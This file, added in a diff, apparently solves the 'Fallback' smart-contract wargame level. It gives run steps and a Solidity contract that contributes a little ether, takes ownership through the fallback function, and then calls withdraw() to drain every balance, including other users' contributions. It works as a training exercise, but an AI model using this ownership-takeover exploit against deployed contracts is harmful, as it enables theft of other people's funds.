@@ -1,0 +1,49 @@
+How to run:
+
+1. Deploy "Fallback" contract and copy the address
+2. Put this address as the value for Solution.fallbackContract state variable
+3. Deploy "Solution" contract along with 500 wei
+4. Run Solution.tellVictimBalance() - should return 0 wei
+5. Run Solution.tellAttackerBalance() - should return 500 wei
+6. Check the value of Fallback.owner - should show the address that deployed "Fallback" contract
+7. Run Solution.becomeOwner()
+8. Check the value of Fallback.owner - Should return address of "Solution" contract
+9. Run Solution.tellVictimBalance() - should return 200 wei
+10. Run Solution.tellAttackerBalance() - should return 300 wei
+11. Run Solution.stealFunds(). This will steal ALL ether from the contract includng contributions made by other users
+12. Run Solution.tellVictimBalance() - should return 0 wei
+13. Run Solution.tellAttackerBalance() - should return 500 wei.
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.10;
+
+contract Solution
+{
+    address fallbackContract = 0xd9145CCE52D386f254917e481eB44e9943F39138;
+    
+    constructor() payable{}
+    
+    function becomeOwner() public
+    {
+        fallbackContract.call{value: 100 wei}(abi.encodeWithSignature("contribute()"));
+        fallbackContract.call{value: 100 wei}("");     
+    }
+
+    function stealFunds() public
+    {
+        fallbackContract.call(abi.encodeWithSignature("withdraw()"));
+    }       
+
+    fallback() external payable {}
+
+    function tellAttackerBalance() public view returns(uint)
+    {
+        return address(this).balance;
+    }
+
+    function tellVictimBalance() public view returns(uint)
+    {
+        return fallbackContract.balance;
+    }
+}
